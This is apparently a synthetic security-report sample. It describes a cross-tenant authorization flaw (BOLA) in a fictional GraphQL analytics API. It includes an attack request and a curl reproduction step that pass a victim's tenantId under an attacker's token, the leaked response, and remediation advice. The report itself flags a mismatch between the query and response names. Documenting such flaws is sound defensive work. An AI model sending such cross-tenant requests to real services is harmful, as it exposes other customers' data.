# Security Analysis Report
**System:** InsightGraph Analytics API
**Domain:** Data Analytics / BI Platform
**Example ID:** GQL-0295
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.10 | Cross-service identity propagation drift on `listResources` — attacker from `tenant-cfdd` reads BI analytics records owned by `tenant-aa0b` |

---

## Finding 1 — BOLA: Cross-Service Identity Propagation Drift (Pattern 1.10)

### Summary
The `listResources` resolver on InsightGraph Analytics API (`api.insightgraph-analyti.example.com`) accepts a client-supplied `tenantId` filter argument without validating it against the JWT's `tenantId` claim. Per §5.0 Pattern 1.10, when identity propagation drifts across service calls (the `tenantId` claim is not re-validated at the resolver level), cross-tenant data access becomes possible. The Redis cache is keyed by `resourceId` only (no tenant dimension), amplifying the risk.

**Context.txt inconsistency (documented):** The HAR request uses `listResources(tenantId: "tenant-aa0b")` but the response JSON key is `getResource`. These names conflict. The HAR (§6.0) request is the primary evidence.

**Note on `x-request-id`:** This appears as a *response* header (`"x-request-id": "req-cfddaa0b"`). It is server-assigned and must NOT be sent as a request header.

**Pattern:** 1.10 — Cross-service identity propagation drift (BOLA)
**Affected resolver:** `listResources`
**Affected endpoint:** `POST https://api.insightgraph-analyti.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (attacker JWT: `tenant-cfdd`, supplying victim `tenantId: "tenant-aa0b"`)**
```
POST https://api.insightgraph-analyti.example.com/graphql
authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
content-type: application/json
x-tenant-id: tenant-cfdd

{"query": "query VulnerableOp { listResources(tenantId: \"tenant-aa0b\") { resourceId ownerId data { sensitiveField } } }"}
```

**Response — Cross-Tenant BI Record Returned**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-aa0b",
      "ownerId": "other-user-cfddaa0b",
      "data": {
        "sensitiveField": "CONFIDENTIAL-cfddaa0b",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
*`x-request-id: req-cfddaa0b` — server-assigned response header, confirms cross-tenant access.*

### Steps to Reproduce
```bash
curl -s -X POST "https://api.insightgraph-analyti.example.com/graphql" \
  -H "authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "content-type: application/json" \
  -H "x-tenant-id: tenant-cfdd" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-aa0b\") { resourceId ownerId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-aa0b returned for tenant-cfdd caller
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. `listResources` must ignore client-supplied `tenantId`; extract from JWT only.
2. Re-validate `tenantId` at each resolver level — do not drift from upstream service identity.
3. Key Redis cache on `tenantId:resourceId` composite, not `resourceId` alone.
